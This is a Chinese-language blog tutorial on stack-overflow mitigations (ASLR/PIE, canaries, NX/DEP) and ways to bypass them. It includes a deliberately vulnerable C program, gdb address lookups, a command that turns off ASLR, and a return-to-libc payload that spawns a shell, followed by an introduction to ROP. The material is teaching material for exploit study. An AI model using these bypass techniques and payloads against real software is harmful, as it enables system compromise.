@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/webicon-32x32-house.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/webicon-16x16-house.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-loading-bar.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"harpersu00.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"Available values":"default | flat | mac","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="栈溢出的基本原理以及shellcode利用可以查看我的上一篇文章——栈溢出之shellcode。 栈溢出缓解措施介绍栈地址随机化（攻击者不知道shellcode的地址，无法构造return address）：ASLR（地址空间随机化）、PIE（地址无关可执行文件） 检测栈溢出，并报错退出：Stack Canary&#x2F;Cookie 栈不可执行：NX（不执行）&#x2F;DEP（数据执行保护）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈溢出之 ROP（一）">
+<meta property="og:url" content="https://harpersu00.github.io/b1689cf9.html">
+<meta property="og:site_name" content="harpersu00&#39;s Blog">
+<meta property="og:description" content="栈溢出的基本原理以及shellcode利用可以查看我的上一篇文章——栈溢出之shellcode。 栈溢出缓解措施介绍栈地址随机化（攻击者不知道shellcode的地址，无法构造return address）：ASLR（地址空间随机化）、PIE（地址无关可执行文件） 检测栈溢出，并报错退出：Stack Canary&#x2F;Cookie 栈不可执行：NX（不执行）&#x2F;DEP（数据执行保护）">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://harpersu00.github.io/images/2019-03-12-栈溢出之-ROP（一）/图1.png">
+<meta property="og:image" content="https://harpersu00.github.io/images/2019-03-12-栈溢出之-ROP（一）/图2.png">
+<meta property="og:image" content="https://harpersu00.github.io/images/2019-03-12-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8B-ROP%EF%BC%88%E4%B8%80%EF%BC%89/%E5%9B%BE3.png">
+<meta property="article:published_time" content="2019-03-11T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-11-03T06:14:14.751Z">
+<meta property="article:author" content="harpersu00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://harpersu00.github.io/images/2019-03-12-栈溢出之-ROP（一）/图1.png">
+
+<link rel="canonical" href="https://harpersu00.github.io/b1689cf9.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>栈溢出之 ROP（一） | harpersu00's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">harpersu00's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-book fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fas fa-list fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://harpersu00.github.io/b1689cf9.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar1.JPG">
+      <meta itemprop="name" content="harpersu00">
+      <meta itemprop="description" content="记录，记录一下ing">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="harpersu00's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          栈溢出之 ROP（一）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-03-12 00:00:00" itemprop="dateCreated datePublished" datetime="2019-03-12T00:00:00+08:00">2019-03-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">漏洞利用</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>栈溢出的基本原理以及shellcode利用可以查看我的上一篇文章——<a href="https://harpersu00.github.io/adec3bdf.html">栈溢出之shellcode</a>。</p>
+<h2 id="栈溢出缓解措施介绍"><a href="#栈溢出缓解措施介绍" class="headerlink" title="栈溢出缓解措施介绍"></a>栈溢出缓解措施介绍</h2><p>栈地址随机化（攻击者不知道shellcode的地址，无法构造return address）：ASLR（地址空间随机化）、PIE（地址无关可执行文件）</p>
+<p>检测栈溢出，并报错退出：Stack Canary/Cookie</p>
+<p>栈不可执行：NX（不执行）/DEP（数据执行保护）</p>
+<a id="more"></a>
+
+<h3 id="ASLR-和-PIE"><a href="#ASLR-和-PIE" class="headerlink" title="ASLR 和 PIE"></a>ASLR 和 PIE</h3><p>ASLR是地址空间随机化。开启后，堆、栈、共享库都会有一个随机偏移，堆和共享库往上（高地址处）偏移一个随机量，栈往下（低地址处）偏移。随机粒度为0x1000，一个内存页的大小。</p>
+<p>单独开启ASLR，虽然堆、栈、共享库都会被随机化，但是程序的入口代码加载还是在固定地址0x804800。</p>
+<p>PIE（地址无关代码）开启后，编译器会在编译时生成地址无关代码，编译选项<code>-fPIC -pie</code>，这样程序就可以在随机地址处被加载。也就是程序的代码以及数据段会往上（高地址处）偏移一个随机量。如下图所示。</p>
+<img src="../images/2019-03-12-栈溢出之-ROP（一）/图1.png" width="800" height="550" align="middle" />
+
+<p>使用<code>ldd</code>命令查看加载库的地址，可以看到两次都不一样。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> ldd a.out </span><br><span class="line">	linux<span class="literal">-gate</span>.so.<span class="number">1</span> =&gt;  (<span class="number">0</span>xf77c7000)</span><br><span class="line">	libc.so.<span class="number">6</span> =&gt; /lib/libc.so.<span class="number">6</span> (<span class="number">0</span>xf75e6000)</span><br><span class="line">	/lib/ld<span class="literal">-linux</span>.so.<span class="number">2</span> (<span class="number">0</span>xf77c8000)</span><br><span class="line"><span class="variable">$</span> ldd a.out </span><br><span class="line">	linux<span class="literal">-gate</span>.so.<span class="number">1</span> =&gt;  (<span class="number">0</span>xf7798000)</span><br><span class="line">	libc.so.<span class="number">6</span> =&gt; /lib/libc.so.<span class="number">6</span> (<span class="number">0</span>xf75b7000)</span><br><span class="line">	/lib/ld<span class="literal">-linux</span>.so.<span class="number">2</span> (<span class="number">0</span>xf7799000)</span><br></pre></td></tr></table></figure>
+
+<p>查看程序加载地址：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> gcc test.c <span class="literal">-m32</span> <span class="literal">-fPIC</span> <span class="literal">-pie</span> <span class="literal">-o</span> a2.out</span><br><span class="line"><span class="variable">$</span> gdb <span class="literal">-q</span> a2.out</span><br><span class="line">Reading symbols from /home/scbox/Documents/a2.out...(no debugging symbols found)...done.</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="built_in">disable-randomization</span> off <span class="comment">#如果不开启这个选项，则在gdb中默认是不随机化的</span></span><br><span class="line">(gdb) b main</span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0</span>x5ff</span><br><span class="line">(gdb) <span class="built_in">r</span></span><br><span class="line">Starting program: /home/scbox/Documents/a2.out </span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0</span>x565855ff <span class="keyword">in</span> main ()</span><br><span class="line">Missing separate debuginfos, use: debuginfo<span class="literal">-install</span> glibc<span class="literal">-2</span>.<span class="number">17</span><span class="literal">-307</span>.el7.<span class="number">1</span>.i686</span><br><span class="line">...</span><br><span class="line"><span class="variable">$</span> gdb <span class="literal">-q</span> a2.out</span><br><span class="line">...</span><br><span class="line">(gdb) <span class="built_in">r</span></span><br><span class="line">Starting program: /home/scbox/Documents/a2.out </span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0</span>x565e25ff <span class="keyword">in</span> main ()  <span class="comment">#两次main函数的地址不一样了</span></span><br><span class="line">Missing separate debuginfos, use: debuginfo<span class="literal">-install</span> glibc<span class="literal">-2</span>.<span class="number">17</span><span class="literal">-307</span>.el7.<span class="number">1</span>.i686</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>只是开启了ASLR，没有开启PIE的话，可以通过<code>Return to PLT</code>，绕过共享库随机化。（比如将shellcode放置在.data段，这部分是不会随机化的）</li>
+<li>x86_32架构下爆破（因为随机化粒度为0x1000，所以只有几千种可能）</li>
+<li>info leak（信息泄露，比如在我的<a href="https://harpersu00.github.io/7e77e3d1.html">（译）Analysis and exploitation of Pegasus kernel vulnerabilities (CVE-2016-4655 / CVE-2016-4656)</a>文章中介绍的CVE-2016-4655漏洞）</li>
+<li>nop sled（在shellcode之前添加大段nop指令，在上一篇<a href="https://harpersu00.github.io/adec3bdf.html">栈溢出之shellcode</a>的文章中，使用了这种方法）</li>
+<li>heap spray（堆喷）</li>
+<li>在本地环境中，可以使用<code>ulimit -s unilimited</code>命令（程序崩溃后会生成core dump文件，可以在这个文件中查看shellcode地址）</li>
+</ul>
+<h3 id="Stack-Canary-Cookie"><a href="#Stack-Canary-Cookie" class="headerlink" title="Stack Canary/Cookie"></a>Stack Canary/Cookie</h3><p>这个机制是用来检测栈溢出的。对于需要保护的函数，在执行之前，将一个随机值放在栈上，这个值被称为Canary。在64位上一般在rbp-0x8的位置，32位在ebp-0x4的位置，也就是ebp保存地址往下（低地址）的部分。然后在函数返回之前，会先检测这个值是否发生改变。stack_chk_fail的错误信息就是由于栈溢出。通过编译选项<code>gcc -fstack-protector</code>可以开启。</p>
+<img src="../images/2019-03-12-栈溢出之-ROP（一）/图2.png" width="650" height="450" align="middle" />
+
+<p>可以通过泄露Canary的方式绕过（同一进程不同线程的函数的Canary是一样的，比如read函数）</p>
+<p>控制覆盖长度（只覆盖局部变量，不覆盖返回地址）</p>
+<p>修改Canary（Canary保存在TLS(Thread-local Storage)寄存器中，一般是偏移0x14的位置stack_guard）</p>
+<p>劫持stack_chk_fail（canary被覆盖时，就会调用这个函数，劫持后可跳转到自己的shellcode，比如<a href="https://harpersu00.github.io/1e59798b.html">GOT表劫持</a>）</p>
+<p>利用stack_chk_fail的报错信息（在报错信息中，会打印栈溢出的程序名，即argv[0]，可以覆盖这个地址为其他地址，输出我们想知道的内容）</p>
+<h3 id="NX-DEP"><a href="#NX-DEP" class="headerlink" title="NX/DEP"></a>NX/DEP</h3><p>栈不可执行主要是对程序的内存块权限进行更进一步的划分。堆、栈以及数据区可写，但不可执行。代码区、只读数据区不可写，但可执行。也就是说我们要找一块内存区域是既可写也可以执行的，来写入shellcode，是找不到了。</p>
+<p>绕过NX/DEP所需要的方法有一个基本思想，就是Return to Libc。因为我们不能执行写入的代码，那我们就跳转到程序已经加载了的代码中执行，比如libc中的大量函数，system()等等。</p>
+<p><img src="/images/2019-03-12-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8B-ROP%EF%BC%88%E4%B8%80%EF%BC%89/%E5%9B%BE3.png"></p>
+<p>如上图所示，我们将函数的return地址覆盖为libc中的system函数地址，当进程跳转到这个地址时，会执行system函数内部的指令，首先是所有函数都有的，<code>push ebp;</code> 跟<code> mov ebp, esp;</code>这两条指令，即将<code>exit</code>的地址push到。需要读取栈上的参数，即”/bin/sh”，</p>
+<h2 id="Return-to-libc"><a href="#Return-to-libc" class="headerlink" title="Return to libc"></a>Return to libc</h2><p>shellcode以及含有栈溢出漏洞的代码都采用的是跟我上一篇文章一样的代码。</p>
+<p>含有栈溢出漏洞的代码:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">128</span>];</span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Please input one argument!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">strcpy</span>(buffer, argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;argv[1]: %s\n&quot;</span>, buffer);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译命令<code>gcc test.c -m32</code></p>
+<p>需要关闭ASLR:<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p>
+<p>跟前文不同的是，由于没有关闭NP/DEP，所以栈上的shellcode是无法执行的，所以我们要用已经加载的库中的函数来执行我们想要的代码。</p>
+<p>首先，使用gdb查看system以及exit函数地址，在libc中查找字符串<code>&quot;/bin/sh&quot;</code>地址：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> gdb ./a.out </span><br><span class="line">......</span><br><span class="line">Reading symbols from /home/scbox/Documents/a.out...(no debugging symbols found)...done.</span><br><span class="line">(gdb) b main</span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0</span>x8048470</span><br><span class="line">(gdb) <span class="built_in">r</span></span><br><span class="line">Starting program: /home/scbox/Documents/./a.out </span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0</span>x08048470 <span class="keyword">in</span> main ()</span><br><span class="line">Missing separate debuginfos, use: debuginfo<span class="literal">-install</span> glibc<span class="literal">-2</span>.<span class="number">17</span><span class="literal">-307</span>.el7.<span class="number">1</span>.i686</span><br><span class="line">(gdb) p system <span class="comment">#打印system()函数的地址</span></span><br><span class="line"><span class="variable">$1</span> = &#123;&lt;text variable, no debug info&gt;&#125; <span class="number">0</span>xf7e36f70 &lt;system&gt;</span><br><span class="line">(gdb) p <span class="keyword">exit</span> <span class="comment">#打印exit()函数的地址</span></span><br><span class="line"><span class="variable">$2</span> = &#123;&lt;text variable, no debug info&gt;&#125; <span class="number">0</span>xf7e2a7a0 &lt;<span class="keyword">exit</span>&gt;</span><br><span class="line">(gdb) info proc mappings</span><br><span class="line"><span class="keyword">process</span> <span class="number">97414</span></span><br><span class="line">Mapped address spaces:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Start</span> Addr   <span class="keyword">End</span> Addr       Size     Offset objfile</span><br><span class="line">......</span><br><span class="line">	<span class="number">0</span>xf7df7000 <span class="number">0</span>xf7df8000     <span class="number">0</span>x1000        <span class="number">0</span>x0 </span><br><span class="line">	<span class="number">0</span>xf7df8000 <span class="number">0</span>xf7fbc000   <span class="number">0</span>x1c4000        <span class="number">0</span>x0 /usr/lib/libc<span class="literal">-2</span>.<span class="number">17</span>.so <span class="comment">#起始地址</span></span><br><span class="line">	<span class="number">0</span>xf7fbc000 <span class="number">0</span>xf7fbd000     <span class="number">0</span>x1000   <span class="number">0</span>x1c4000 /usr/lib/libc<span class="literal">-2</span>.<span class="number">17</span>.so</span><br><span class="line">	<span class="number">0</span>xf7fbd000 <span class="number">0</span>xf7fbf000     <span class="number">0</span>x2000   <span class="number">0</span>x1c4000 /usr/lib/libc<span class="literal">-2</span>.<span class="number">17</span>.so</span><br><span class="line">	<span class="number">0</span>xf7fbf000 <span class="number">0</span>xf7fc0000     <span class="number">0</span>x1000   <span class="number">0</span>x1c6000 /usr/lib/libc<span class="literal">-2</span>.<span class="number">17</span>.so <span class="comment">#结束地址</span></span><br><span class="line">	<span class="number">0</span>xf7fc0000 <span class="number">0</span>xf7fc3000     <span class="number">0</span>x3000        <span class="number">0</span>x0 </span><br><span class="line">......</span><br><span class="line">	<span class="number">0</span>xfffdd000 <span class="number">0</span>xffffe000    <span class="number">0</span>x21000        <span class="number">0</span>x0 [<span class="type">stack</span>]</span><br><span class="line">(gdb) find /b <span class="number">0</span>xf7df8000, <span class="number">0</span>xf7fc0000, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="number">0</span> <span class="comment">#查找字符串</span></span><br><span class="line"><span class="number">0</span>xf7f78015</span><br><span class="line"><span class="number">1</span> pattern found.</span><br><span class="line">(gdb) x/s <span class="number">0</span>xf7f78015</span><br><span class="line"><span class="number">0</span>xf7f78015:	<span class="string">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这一步，也可以使用<code>reaelf</code> <code>strings</code>等命令查看system、exit函数地址，以及/bin/sh字符串地址：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> ldd a.out <span class="comment">#查看libc库起始地址</span></span><br><span class="line">	linux<span class="literal">-gate</span>.so.<span class="number">1</span> =&gt;  (<span class="number">0</span>xf7fd9000)</span><br><span class="line">	libc.so.<span class="number">6</span> =&gt; /lib/libc.so.<span class="number">6</span> (<span class="number">0</span>xf7df8000)</span><br><span class="line">	/lib/ld<span class="literal">-linux</span>.so.<span class="number">2</span> (<span class="number">0</span>xf7fda000)</span><br><span class="line"><span class="variable">$</span> readelf <span class="literal">-s</span> /lib/libc.so.<span class="number">6</span> | grep system<span class="selector-tag">@</span>  <span class="comment">#在libc库中查找system偏移地址</span></span><br><span class="line">   <span class="number">627</span>: <span class="number">0003</span>ef70    <span class="number">98</span> FUNC    GLOBAL DEFAULT   <span class="number">13</span> __libc_system<span class="selector-tag">@</span>@GLIBC_PRIVATE</span><br><span class="line">  <span class="number">1454</span>: <span class="number">0003</span>ef70    <span class="number">98</span> FUNC    WEAK   DEFAULT   <span class="number">13</span> system<span class="selector-tag">@</span>@GLIBC_2.<span class="number">0</span></span><br><span class="line"><span class="variable">$</span> readelf <span class="literal">-s</span> /lib/libc.so.<span class="number">6</span> | grep <span class="keyword">exit</span><span class="selector-tag">@</span>  <span class="comment">#在libc库中查找exit偏移地址</span></span><br><span class="line">   <span class="number">113</span>: <span class="number">00032</span>c70    <span class="number">58</span> FUNC    GLOBAL DEFAULT   <span class="number">13</span> __cxa_at_quick_exit<span class="selector-tag">@</span>@GLIBC_2.<span class="number">10</span></span><br><span class="line">   <span class="number">141</span>: <span class="number">000327</span>a0    <span class="number">45</span> FUNC    GLOBAL DEFAULT   <span class="number">13</span> <span class="keyword">exit</span><span class="selector-tag">@</span>@GLIBC_2.<span class="number">0</span></span><br><span class="line">   ......</span><br><span class="line"><span class="variable">$</span> strings <span class="literal">-tx</span> /lib/libc.so.<span class="number">6</span> | grep /bin/sh  <span class="comment">#在libc库中查找字符串偏移地址</span></span><br><span class="line"> <span class="number">180015</span> /bin/sh</span><br><span class="line"><span class="variable">$</span> gdb <span class="literal">-q</span>   <span class="comment">#在gdb中计算地址</span></span><br><span class="line">(gdb) p/x <span class="number">0</span>xf7df8000 + <span class="number">0</span>x0003ef70 <span class="comment">#起始地址+偏移地址</span></span><br><span class="line"><span class="variable">$1</span> = <span class="number">0</span>xf7e36f70</span><br><span class="line">(gdb) p/x <span class="number">0</span>xf7df8000 + <span class="number">0</span>x000327a0</span><br><span class="line"><span class="variable">$2</span> = <span class="number">0</span>xf7e2a7a0</span><br><span class="line">(gdb) p/x <span class="number">0</span>xf7df8000 + <span class="number">0</span>x180015</span><br><span class="line"><span class="variable">$3</span> = <span class="number">0</span>xf7f78015</span><br></pre></td></tr></table></figure>
+
+<p>然后对应着前面的图，填充地址就可以执行了：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> ./a.out <span class="variable">$</span>(python <span class="literal">-c</span> <span class="string">&#x27;print &quot;A&quot; * 140 + &quot;\x70\x6f\xe3\xf7&quot; + &quot;\xa0\xa7\xe2\xf7&quot; + &quot;\x15\x80\xf7\xf7&quot; + &quot;\0\0\0\0&quot;&#x27;</span>)</span><br><span class="line">argv[<span class="number">1</span>]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApo���������</span><br><span class="line">sh<span class="literal">-4</span>.<span class="number">2</span><span class="comment">#  #进入shell啦</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的A*140，是因为从buffer的起始地址到ret返回地址有140个字节的长度（具体计算可参考上一篇有关shellcode的文章）。</p>
+<blockquote>
+<p>这里需要注意的是，如果地址中出现0a，比如0xf7f70aa0，为\xa0\x0a\xf7\xf7，在这里\x0a在命令行参数中代表换行符\n，所以会截断字符，这是就需要替换掉这个地址，找其他函数或者字符串。如果是\x20，代表回车，需要用双引号括起来。</p>
+</blockquote>
+<p><code>Return to libc</code>方法的不足之处在于，如果开启了ASLR，那么我们就没法事先确定动态库的加载位置了。</p>
+<p>另外还有一种方法叫<code>Return to PLT</code>，PLT在我的<a href="https://harpersu00.github.io/1e59798b.html">GOT表劫持</a>这篇文章中有介绍，是在懒加载的时候使用的，如果程序已经调用过了这个动态库函数，那么可以直接通过PLT调用，不需要知道它的实际地址。</p>
+<h2 id="ROP-Return-Oriented-Programming"><a href="#ROP-Return-Oriented-Programming" class="headerlink" title="ROP (Return Oriented Programming)"></a>ROP (Return Oriented Programming)</h2><p>在<code>Return to libc</code>中我们直接找的函数地址，我们也可以将函数拆成几条指令组成的以<code>ret</code>指令结尾的小代码片段的集合，来执行，这就是ROP。（Return to libc其实就是ROP中的一个特例）</p>
+<p>这些小的以<code>ret</code>指令结尾的代码片段，被称之为<code>ROP gadget</code>。（之所以是ret结尾，是因为ret之后会从栈中读取下一个返回地址（gadget），然后继续执行，这样才可以把gadget拼接到一起）</p>
+<p>多个<code>ROP gadget</code>拼接成的可执行片段称为ROP链。</p>
+<p>在栈上填充的用于执行ROP链的数据，成为<code>ROP Payload</code>。</p>
+<blockquote>
+<p>ROP是使用以ret结尾的片段。</p>
+<p>使用以jmp结尾的片段叫做JOP，<code>pop esi; jmp dword[esi+0x10]</code></p>
+<p>以call结尾的片段叫做COP，<code>mov eas, dword[esp+0x20]; call dwork[eax+0x20]</code></p>
+<p>（JOP和COP有时也被合并到ROP中）</p>
+</blockquote>
+<p>ROP Gadget现在已经有很多成熟的搜索工具，比较常用的是<a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget">ROPGadget</a>。</p>
